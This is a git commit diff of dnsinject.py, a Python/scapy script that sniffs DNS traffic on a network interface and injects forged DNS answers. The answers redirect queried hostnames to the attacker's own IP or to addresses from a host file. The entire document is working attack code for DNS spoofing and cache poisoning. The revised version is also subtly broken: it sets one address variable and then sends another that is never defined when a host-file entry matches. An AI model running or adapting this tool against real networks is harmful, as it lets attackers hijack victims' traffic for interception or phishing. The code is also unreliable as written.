1910a816cddb3ba9863d8d5d222a36ce2d749be4
dylsugar <dylansuga@gmail.com>
2021-03-21 00:55:39 -1000

    new dns

--- dnsinject.py
+++ dnsinject.py
@@ -1,62 +1,54 @@
 from scapy.all import *
 from scapy.all import send as ssend
 import netifaces as ni
-import logging
 
 conf.sniff_promisc=True
 addr='127.0.0.1'
-hostnames_specified = False
-interface = 'enpOs3'
+interface='en0'
+hostnames_there=False
 dns_holder = dict()
-def poison_cache(pkt):
-    global interface
-    global hostnames_specified
-    global addr
-    if IP in pkt:
-        ip_src = pkt[IP].src
-        ip_dst = pkt[IP].dst
-        if pkt.getlayer(DNS).qr == 1 and pkt[DNS].opcode == 0:     
-            query = pkt[DNS].qd
-            pkt[UDP].chksum = None
-            print("queryname: "+ str(query.qname))
-            inmap = False
-            for e in dns_holder.keys():
-                if bytes(e.encode()) == query.qname:
-                    inmap = True
-                    newqname = e
+def inject_packet(pkt):
+    global interface,addr,hostnames_there
+    
+    #A response and no error
+    if pkt.getlayer(DNS).qr == 1 and pkt[DNS].opcode == 0:     
+        query = pkt[DNS].qd
+        pkt[UDP].chksum = None
+        inmap = False
+        for e in dns_holder.keys():#because query.qname has to be decoded
+            if bytes(e.encode()) == query.qname:
+                inmap = True
+                newqname = e
 
-            if hostnames_specified and inmap:
-                poison_addr = dns_holder[newqname]
-                print("Preparing spoofed packet with spoofed address from host file --->",poison_addr)
-            else:
-                poison_addr = addr
-            inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qd=query,qr=1,aa=0,rcode=0, an=DNSRR(rrname=query.qname,ttl=350, rdata=poison_addr))
-            send(inject_packet, iface=interface)
-            print('Sent:', inject_packet.summary())
+        if hostnames_there and inmap: #matches with a host from hostnames
+            poison_addr = dns_holder[newqname]
+            print("Conjuring Spoof Packet with ip --->",poison_addr)
+        else:#use local machine ip
+            spoofip = addr
+        inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qd=query,qr=1,aa=0,rcode=0, an=DNSRR(rrname=query.qname,ttl=350, rdata=spoofip))
+        send(inject_packet, iface=interface)
+        print('Whats in the packet?', inject_packet.summary())
 
 def main():
-    global interface
-    global addr
-    global hostnames_specified
+    global interface, addr, hostnames_there
     interface = ni.gateways()['default'][ni.AF_INET][1]
     addr = ni.ifaddresses(str(interface))[ni.AF_INET][0]['addr']
     command = sys.argv
-    print(command)
     if "-h" in command:
         hostnamefile = command[command.index("-h")+1]
-        hostnames_specified = True
+        hostnames_there = True
 
     if "-i" in command:
         interface = command[command.index("-i")+1]
 
-    if hostnames_specified:
+    if hostnames_there:
         hf = open(hostnamefile, "r")
         for line in hf:
             ip_host = line.split(',')
             dns_holder[ip_host[1].strip() + "."] = str(ip_host[0]).strip()
-    print("Poison Map: " + str(dns_holder))
-    print("Sniffing on packets on interface: "+ str(interface))
-    sniff(iface = interface,filter = 'port 53', prn = poison_cache, store = 0)
+    print("Current Interface: "+str(interface))
+    print("Sniffing has begun...")
+    sniff(iface = interface,filter = 'port 53', prn = inject_packet, store = 0)
 if __name__ == "__main__":
     main()
 
